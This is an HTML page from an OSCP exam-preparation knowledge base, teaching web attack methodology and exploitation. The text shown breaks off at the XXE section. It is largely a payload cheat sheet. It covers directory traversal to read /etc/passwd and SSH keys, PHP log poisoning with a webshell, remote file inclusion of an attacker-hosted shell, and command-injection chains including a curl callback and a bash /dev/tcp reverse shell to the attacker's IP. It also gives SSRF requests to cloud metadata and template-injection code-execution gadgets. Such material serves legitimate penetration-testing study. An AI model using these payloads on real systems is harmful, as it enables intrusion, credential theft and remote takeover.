@@ -1,0 +1,522 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Web &amp; SQL Injection · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">🌐 Web &amp; SQL Injection</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v4-[web-quick]-first-5-minutes-on-any-web-port-one-screen">[WEB-QUICK]  first 5 minutes on any web port  (one screen)</a><a class="navlink lvl1" href="#v4-[web-methodology]-the-order-to-work-in-map-then-attack">[WEB-METHODOLOGY]  the order to work in (map, THEN attack)</a><a class="navlink lvl1" href="#v4-web-vulnerability-reference-how-to-exploit-each-one">WEB VULNERABILITY REFERENCE — how to exploit each one</a><a class="navlink lvl2" href="#v4-[web-lfi]-local-file-inclusion-trick-the-site-into-reading-files-off-its-own-disk-[found-lfi]">[WEB-LFI]  Local File Inclusion — trick the site into reading files off its own disk  → [FOUND-LFI]</a><a class="navlink lvl2" href="#v4-[web-rfi]-remote-file-inclusion-make-the-site-load-your-file">[WEB-RFI]  Remote File Inclusion — make the site load YOUR file</a><a class="navlink lvl2" href="#v4-[web-cmdinj]-command-injection-your-input-reaches-the-os-shell-[found-cmdinj]">[WEB-CMDINJ]  Command Injection — your input reaches the OS shell  → [FOUND-CMDINJ]</a><a class="navlink lvl2" href="#v4-[web-ssrf]-server-side-request-forgery-make-the-server-fetch-urls-for-you">[WEB-SSRF]  Server-Side Request Forgery — make the server fetch URLs for you</a><a class="navlink lvl2" href="#v4-[web-ssti]-server-side-template-injection-inject-into-the-page-templating-engine">[WEB-SSTI]  Server-Side Template Injection — inject into the page-templating engine</a><a class="navlink lvl2" href="#v4-[web-xxe]-xml-external-entity-abuse-an-xml-parser-to-read-files">[WEB-XXE]  XML External Entity — abuse an XML parser to read files</a><a class="navlink lvl2" href="#v4-[web-upload]-malicious-file-upload-[found-upload]">[WEB-UPLOAD]  Malicious File Upload  → [FOUND-UPLOAD]</a><a class="navlink lvl2" href="#v4-[web-deserialize]-insecure-deserialization">[WEB-DESERIALIZE]  Insecure Deserialization</a><a class="navlink lvl2" href="#v4-[web-idor]-insecure-direct-object-reference-access-data-that-isnt-yours">[WEB-IDOR]  Insecure Direct Object Reference — access data that isn&#x27;t yours</a><a class="navlink lvl2" href="#v4-[web-jwt]-json-web-tokens-forge-your-own-login-token">[WEB-JWT]  JSON Web Tokens — forge your own login token</a><a class="navlink lvl2" href="#v4-[web-authbypass]-ways-to-get-past-a-login">[WEB-AUTHBYPASS]  ways to get past a login</a><a class="navlink lvl2" href="#v4-[web-xss]-cross-site-scripting-rarely-the-oscp-path-just-recognise-it">[WEB-XSS]  Cross-Site Scripting  (rarely the OSCP path — just recognise it)</a><a class="navlink lvl1" href="#v4-[sqli]-sql-injection-attacking-the-database-mini-course">[SQLI]  SQL INJECTION — attacking the database (mini-course)</a><a class="navlink lvl2" href="#v4-[sqli-quick]-the-core-moves-one-screen">[SQLI-QUICK]  the core moves  (one screen)</a><a class="navlink lvl2" href="#v4-[sqli-decision-tree]-which-technique-do-i-use">[SQLI-DECISION-TREE]  which technique do I use?</a><a class="navlink lvl2" href="#v4-[sqli-detect]-proving-its-injectable">[SQLI-DETECT]  proving it&#x27;s injectable</a><a class="navlink lvl2" href="#v4-[sqli-union]-union-based-extraction-when-results-are-shown">[SQLI-UNION]  union-based extraction (when results are shown)</a><a class="navlink lvl2" href="#v4-[sqli-blind]-boolean-time-based-when-nothing-is-shown">[SQLI-BLIND]  boolean &amp; time-based (when nothing is shown)</a><a class="navlink lvl2" href="#v4-[sqli-mysql]-mysql-mariadb">[SQLI-MYSQL]  MySQL / MariaDB</a><a class="navlink lvl2" href="#v4-[sqli-mssql]-microsoft-sql-server-also-[enum-mssql]">[SQLI-MSSQL]  Microsoft SQL Server  → also [ENUM-MSSQL]</a><a class="navlink lvl2" href="#v4-[sqli-postgres]-postgresql-also-[enum-postgres]">[SQLI-POSTGRES]  PostgreSQL  → also [ENUM-POSTGRES]</a><a class="navlink lvl2" href="#v4-[sqli-sqlite]-sqlite">[SQLI-SQLITE]  SQLite</a><a class="navlink lvl2" href="#v4-[sqli-sqlmap]-banned-on-the-exam-practicelearning-only">[SQLI-SQLMAP]  (⛔ BANNED on the exam — practice/learning only)</a><a class="navlink lvl2" href="#v4-[sqli-troubleshooting]">[SQLI-TROUBLESHOOTING]</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v4-oscp-knowledge-base-volume-2">OSCP+ KNOWLEDGE BASE — VOLUME 2</div>
+<h2 id="v4-breaking-websites-web-attack-method-sql-injection-beginner-course">BREAKING WEBSITES: WEB ATTACK METHOD + SQL INJECTION (beginner course)<a class="anchor" href="#v4-breaking-websites-web-attack-method-sql-injection-beginner-course">#</a></h2>
+<blockquote><strong>Read this box first.</strong> Websites are the most common way into a box. This volume has two halves: <strong>(A)</strong> a step-by-step method for exploring and attacking any website, and <strong>(B)</strong> a mini-course on SQL injection (attacking the database behind a website).  <strong>Placeholders:</strong> <code>$IP</code> = the target (set it: <code>export IP=10.10.10.5</code>). <code>http://$IP</code> and <code>http://target</code> mean the same thing — the website. <code>&lt;yourIP&gt;</code> / <code>&lt;yourKaliIP&gt;</code> = <strong>your</strong> attacking machine&#x27;s IP (find it with <code>ip addr show tun0</code>). Whenever you discover a hostname (like <code>blog.corp.local</code>), immediately add it to <code>/etc/hosts</code> (<code>sudo nano /etc/hosts</code> → add <code>&lt;IP&gt;  blog.corp.local</code>) or your browser/tools can&#x27;t reach it.  <strong>Tags</strong> like <code class="tag">[WEB-LFI]</code> are bookmarks — Ctrl+F to jump. <code class="tag">[LOOK-UP]</code> = niche, look it up when needed.  <strong>The rule that saves you:</strong> *map the whole site before you attack any single part of it.* Rushing straight to one input is the #1 beginner mistake.</blockquote>
+<hr>
+<h1 id="v4-[web-quick]-first-5-minutes-on-any-web-port-one-screen">[WEB-QUICK]  first 5 minutes on any web port  (one screen)<a class="anchor" href="#v4-[web-quick]-first-5-minutes-on-any-web-port-one-screen">#</a></h1>
+<pre><code>whatweb http://$IP        # identify the tech: web server, CMS (WordPress/Joomla…), frameworks   [MUST-MEMORIZE]
+curl -sI http://$IP       # show response headers only (server type, redirects, cookie names)
+# then by hand: view page source · read /robots.txt · /sitemap.xml · every .js file · HTML comments
+
+# brute-force hidden folders/files (a &quot;content scan&quot;):
+feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
+#   -u  = the target URL
+#   -w  = the wordlist of names to try (SecLists ships these; install with: sudo apt install seclists)
+#   -x  = also try these file extensions on each word (match the site&#x27;s tech, e.g. php for a PHP site)
+
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+#   FUZZ = the placeholder ffuf swaps each wordlist entry into
+
+# if a hostname shows up (a redirect, or in a cert) → brute &quot;virtual hosts&quot;:
+ffuf -u http://$IP -H &quot;Host: FUZZ.corp.local&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;size&gt;
+#   -H &quot;Host: FUZZ...&quot; = change the Host header (many sites serve DIFFERENT pages per hostname)
+#   -fs &lt;size&gt;         = &quot;filter out responses of this byte-size&quot; — set it to the default-page size to hide noise
+
+nikto -h http://$IP       # quick automated sweep for common misconfigurations</code></pre>
+<p><strong>What to do with the results:</strong></p>
+<ol>
+<li><strong>Identify the stack + version</strong> (e.g. &quot;WordPress 5.8&quot;, &quot;Apache 2.4.49&quot;) → <code>searchsploit &lt;that&gt;</code> to check for ready-made exploits.</li>
+<li><strong>Find the interesting inputs</strong> — login forms, upload forms, and URL parameters (<code>?id=1</code>) → these are where you inject attacks.</li>
+<li><strong>Find hidden directories/vhosts</strong> → repeat this whole scan on each new area you discover.</li>
+</ol>
+<hr>
+<h1 id="v4-[web-methodology]-the-order-to-work-in-map-then-attack">[WEB-METHODOLOGY]  the order to work in (map, THEN attack)<a class="anchor" href="#v4-[web-methodology]-the-order-to-work-in-map-then-attack">#</a></h1>
+<h3 id="v4-1-[web-fingerprint]-what-is-this-site-built-with">1. [WEB-FINGERPRINT]  — what is this site built with?<a class="anchor" href="#v4-1-[web-fingerprint]-what-is-this-site-built-with">#</a></h3>
+<ul>
+<li>Run <code>whatweb</code> and <code>curl -sI</code>. Note the <code>Server</code>, <code>X-Powered-By</code>, and cookie names — they reveal the tech.</li>
+<li><strong>Get the version of everything</strong> (CMS, framework, web server) → <code>searchsploit &lt;product&gt; &lt;version&gt;</code>. A known-vulnerable version is often the whole box.</li>
+<li>HTTPS site? <code>openssl s_client -connect $IP:443</code> — the certificate&#x27;s CN/SAN fields often leak hostnames and virtual hosts.</li>
+</ul>
+<h3 id="v4-2-[web-content]-map-every-page-file-and-input">2. [WEB-CONTENT]  — map every page, file, and input<a class="anchor" href="#v4-2-[web-content]-map-every-page-file-and-input">#</a></h3>
+<ul>
+<li><strong>Source &amp; JavaScript:</strong> read the page source and every <code>.js</code> file for hidden endpoints, API keys, credentials, and developer comments:</li>
+</ul>
+<p>  <code>curl -s http://$IP/app.js | grep -iE &#x27;api|key|token|passw|secret|/admin&#x27;</code></p>
+<ul>
+<li><strong>Well-known paths to check:</strong> <code>/robots.txt</code>, <code>/sitemap.xml</code>, <code>/.well-known/</code>, <code>/.git/</code>, <code>/.env</code>, <code>/backup</code>, <code>/config</code>.</li>
+<li><strong>Directory brute-force</strong> (find hidden folders): feroxbuster (auto-recursive) or gobuster/ffuf. Extensions matter — match the stack:</li>
+</ul>
+<p>  <code></code>`bash</p>
+<p>  gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -t 40</p>
+<p>  #   dir      = directory-brute mode</p>
+<p>  #   -t 40    = 40 threads (faster)</p>
+<p>  gobuster dir -u http://$IP -w &lt;list&gt; -b 403,404 -k    # -b = hide these status codes, -k = ignore TLS cert errors</p>
+<p>  <code></code>`</p>
+<ul>
+<li><strong>Files to hunt:</strong> backups (<code>.bak .old .zip .tar.gz</code>, <code>index.php~</code>), config files (<code>config.php</code>, <code>web.config</code>, <code>.env</code>, <code>wp-config.php</code>), and any source-code leaks.</li>
+<li><strong>Virtual hosts / subdomains:</strong> if any hostname appears, brute the <code>Host:</code> header with ffuf and use <code>-fs</code> to filter out the default-size response. Add every hit to <code>/etc/hosts</code>.</li>
+<li><strong>Parameters:</strong> note every <code>?param=value</code>, hidden form field, and API route. Brute for hidden params:</li>
+</ul>
+<p>  <code>ffuf -u &#x27;http://$IP/page?FUZZ=1&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs &lt;size&gt;</code></p>
+<ul>
+<li><strong>Authentication surfaces:</strong> login, register, password-reset, admin panels, upload forms, API auth.</li>
+</ul>
+<h3 id="v4-3-[web-auth]-attack-the-loginsession">3. [WEB-AUTH]  — attack the login/session<a class="anchor" href="#v4-3-[web-auth]-attack-the-loginsession">#</a></h3>
+<ul>
+<li>Try <strong>default/weak creds</strong> (<code>admin/admin</code>, product defaults, any creds you found elsewhere on the box).</li>
+<li>Look at cookies/sessions: predictable session IDs, a tamperable <code>role=user</code> value, or a JWT token (→ <code class="tag">[WEB-JWT]</code>).</li>
+<li>Try <strong>login SQL injection</strong> (auth bypass, <code class="tag">[SQLI]</code>), username enumeration (a different error or response time for valid vs invalid users), and password-reset logic flaws.</li>
+</ul>
+<h3 id="v4-4-[web-vuln-select]-pick-the-attack-based-on-what-the-input-does">4. [WEB-VULN-SELECT]  — pick the attack based on what the input does<a class="anchor" href="#v4-4-[web-vuln-select]-pick-the-attack-based-on-what-the-input-does">#</a></h3>
+<p>Match the clue to the vulnerability class:</p>
+<ul>
+<li>Your input is <strong>shown back on the page</strong> → XSS or SSTI.</li>
+<li>Your input becomes part of a <strong>file path</strong> → LFI/RFI/path traversal.</li>
+<li>Your input goes into a <strong>database query</strong> → SQL injection.</li>
+<li>Your input is passed to an <strong>OS command</strong> → command injection.</li>
+<li>Your input is a <strong>URL the server fetches</strong> → SSRF.</li>
+<li>The app parses <strong>XML</strong> you send → XXE.</li>
+<li>There&#x27;s a <strong>file upload</strong> → malicious file upload.</li>
+<li>A cookie/blob looks like a <strong>serialized object</strong> → deserialization.</li>
+<li><code>id=</code> lets you see <strong>another user&#x27;s data</strong> → IDOR.</li>
+</ul>
+<hr>
+<h1 id="v4-web-vulnerability-reference-how-to-exploit-each-one">WEB VULNERABILITY REFERENCE — how to exploit each one<a class="anchor" href="#v4-web-vulnerability-reference-how-to-exploit-each-one">#</a></h1>
+<h2 id="v4-[web-lfi]-local-file-inclusion-trick-the-site-into-reading-files-off-its-own-disk-[found-lfi]">[WEB-LFI]  Local File Inclusion — trick the site into reading files off its own disk  → <code class="tag">[FOUND-LFI]</code><a class="anchor" href="#v4-[web-lfi]-local-file-inclusion-trick-the-site-into-reading-files-off-its-own-disk-[found-lfi]">#</a></h2>
+<p><strong>What it is:</strong> the site takes a filename from your input and displays that file. If you control the path, you can make it read files it never meant to — passwords, config, SSH keys.</p>
+<p><strong>How to spot it:</strong> a parameter that loads a page or file — <code>?page=</code>, <code>?file=</code>, <code>?template=</code>, <code>?lang=</code>, <code>?include=</code>.</p>
+<pre><code>?page=/etc/passwd                              # can you read a known Linux file? (proves LFI)
+?page=../../../../../../etc/passwd             # &quot;../&quot; climbs up folders (&quot;directory traversal&quot;) to reach it
+?page=....//....//....//etc/passwd             # bypass a filter that strips a single &quot;../&quot;
+?page=/etc/passwd%00                           # null byte cuts off an appended &quot;.php&quot; (very old PHP only)
+?page=..\..\..\..\windows\win.ini             # Windows version of the same idea
+
+# READ THE SITE&#x27;S OWN SOURCE CODE (to find DB creds or the real bug):
+?page=php://filter/convert.base64-encode/resource=index.php   # returns the file base64-encoded → decode it locally
+
+# TURN LFI INTO COMMAND EXECUTION:
+?page=data://text/plain;base64,&lt;base64-of-php-code&gt;           # if the server allows remote includes
+# &quot;log poisoning&quot;: first set your browser&#x27;s User-Agent to  &lt;?php system($_GET[&#x27;c&#x27;]);?&gt;  then:
+?page=/var/log/apache2/access.log&amp;c=id                        # the log now contains your PHP → it runs
+# other useful files: /var/log/auth.log (SSH), /proc/self/environ, /var/mail/&lt;user&gt;, the PHP session file</code></pre>
+<blockquote><strong>What is a &quot;webshell&quot;?</strong> A tiny script (like <code>&lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;</code>) that, once on the server, lets you run OS commands by visiting a URL (<code>?c=whoami</code>). Getting one onto the box is a common goal.</blockquote>
+<p><strong>Grab these:</strong> <code>/etc/passwd</code> (user list), the app&#x27;s config (DB creds), <code>/home/*/.ssh/id_rsa</code> (SSH key), <code>web.config</code>, <code>wp-config.php</code>.</p>
+<p><strong>No log to poison?</strong> Use the <strong>PHP filter-chain</strong> trick to get code execution from pure LFI → <code class="tag">[PARITY3-LFI-FILTERCHAIN]</code>.</p>
+<p><strong>If it fails:</strong> use the base64 filter to read the source and find the *real* vuln; change how many <code>../</code> you use; if <code>.php</code> is auto-appended, use <code>php://filter</code> or a null byte.</p>
+<p><strong>Where it leads:</strong> creds → spray them · code execution → <code class="tag">[SHELL-QUICK]</code>.</p>
+<h2 id="v4-[web-rfi]-remote-file-inclusion-make-the-site-load-your-file">[WEB-RFI]  Remote File Inclusion — make the site load YOUR file<a class="anchor" href="#v4-[web-rfi]-remote-file-inclusion-make-the-site-load-your-file">#</a></h2>
+<p><strong>What it is:</strong> like LFI, but the site fetches a file from a URL you give — so you host a webshell on your machine and point it there. Rarer (needs <code>allow_url_include=On</code>).</p>
+<pre><code># 1) On Kali, save a PHP webshell as shell.txt, then serve the folder: python3 -m http.server 80
+?page=http://&lt;yourKaliIP&gt;/shell.txt    # site downloads and runs YOUR shell; watch your server for the hit</code></pre>
+<p><strong>Where it leads:</strong> code execution → reverse shell.</p>
+<h2 id="v4-[web-cmdinj]-command-injection-your-input-reaches-the-os-shell-[found-cmdinj]">[WEB-CMDINJ]  Command Injection — your input reaches the OS shell  → <code class="tag">[FOUND-CMDINJ]</code><a class="anchor" href="#v4-[web-cmdinj]-command-injection-your-input-reaches-the-os-shell-[found-cmdinj]">#</a></h2>
+<p><strong>What it is:</strong> a feature runs a system tool (ping, nslookup, image/PDF conversion, backup) and sticks your input into the command. Add your own command and it runs too.</p>
+<p><strong>How to spot it:</strong> any feature that clearly runs a program (a &quot;ping this host&quot; box, a converter, etc.).</p>
+<pre><code>; id      | id      &amp; id      &amp;&amp; id      `id`     $(id)     %0aid    # separators — try each to chain your command
+127.0.0.1; id        127.0.0.1 &amp;&amp; whoami          # example: inside a &quot;ping&quot; field
+; sleep 5                                          # BLIND test: if the reply takes 5s longer, it worked
+; curl http://&lt;yourKaliIP&gt;/x                       # BLIND out-of-band: watch your http server for the request
+; bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;yourKaliIP&gt;/443 0&gt;&amp;1&#x27;   # get a reverse shell (URL-ENCODE the whole payload!)
+&amp; powershell -e &lt;base64&gt;                           # Windows target</code></pre>
+<blockquote><strong>&quot;Blind&quot;</strong> means you don&#x27;t see the command&#x27;s output on the page. You confirm it worked indirectly — by a time delay (<code>sleep 5</code>) or by making the server contact you (<code>curl http://you</code>).</blockquote>
+<p><strong>Getting past filters:</strong> spaces blocked → use <code>${IFS}</code> or <code>&lt;</code> · characters blocked → <code>echo &lt;base64&gt;|base64 -d|bash</code> · quotes in the way → close them first: <code>&quot;; id;#</code>.</p>
+<p><strong>Troubleshoot:</strong> URL-encode special characters (<code>;</code>=<code>%3B</code>, space=<code>%20</code>, newline=<code>%0a</code>); try every separator.</p>
+<p><strong>Where it leads:</strong> <code class="tag">[SHELL-QUICK]</code> → stabilise the shell → <code class="tag">[LINUX-PRIVESC]</code>.</p>
+<h2 id="v4-[web-ssrf]-server-side-request-forgery-make-the-server-fetch-urls-for-you">[WEB-SSRF]  Server-Side Request Forgery — make the server fetch URLs for you<a class="anchor" href="#v4-[web-ssrf]-server-side-request-forgery-make-the-server-fetch-urls-for-you">#</a></h2>
+<p><strong>What it is:</strong> the server fetches a URL you supply. You abuse it to reach things *you* can&#x27;t — internal-only services, or cloud metadata that holds credentials.</p>
+<p><strong>How to spot it:</strong> a parameter that takes a URL — <code>url=</code>, <code>redirect=</code>, a webhook field, &quot;fetch from URL&quot;, &quot;image from URL&quot;.</p>
+<pre><code>?url=http://&lt;yourKaliIP&gt;/                          # confirm it actually fetches (your server gets a hit)
+?url=http://127.0.0.1:&lt;port&gt;/                       # reach a service only listening on the server&#x27;s localhost
+?url=http://169.254.169.254/latest/meta-data/       # cloud metadata endpoint → often leaks credentials
+# file:// reads local files; gopher:// can talk to internal services (advanced)</code></pre>
+<p><strong>Where it leads:</strong> discover internal services (then attack them); cloud metadata → creds.</p>
+<h2 id="v4-[web-ssti]-server-side-template-injection-inject-into-the-page-templating-engine">[WEB-SSTI]  Server-Side Template Injection — inject into the page-templating engine<a class="anchor" href="#v4-[web-ssti]-server-side-template-injection-inject-into-the-page-templating-engine">#</a></h2>
+<p><strong>What it is:</strong> many apps build pages from templates. If your input is fed into the template engine unsanitised, you can run code on the server.</p>
+<p><strong>How to spot it:</strong> your input is rendered back *after* server processing (profile names, email templates, error messages).</p>
+<pre><code>${7*7}   {{7*7}}   &lt;%= 7*7 %&gt;   #{7*7}     # if the page prints 49, the engine evaluated it → SSTI
+# identify the engine, then use its code-execution gadget:
+# Jinja2 (Python):
+{{ config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() }}
+# Twig (PHP):
+{{ [&#x27;id&#x27;]|filter(&#x27;system&#x27;) }}
+# Freemarker (Java):
+&lt;#assign x=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${x(&quot;id&quot;)}</code></pre>
+<p><strong>If it fails:</strong> confirm *which* engine it is first (different syntax); watch for a sandbox; try another gadget.</p>
+<p><strong>Where it leads:</strong> code execution → reverse shell.</p>
+<h2 id="v4-[web-xxe]-xml-external-entity-abuse-an-xml-parser-to-read-files">[WEB-XXE]  XML External Entity — abuse an XML parser to read files<a class="anchor" href="#v4-[web-xxe]-xml-external-entity-abuse-an-xml-parser-to-read-files">#</a></h2>
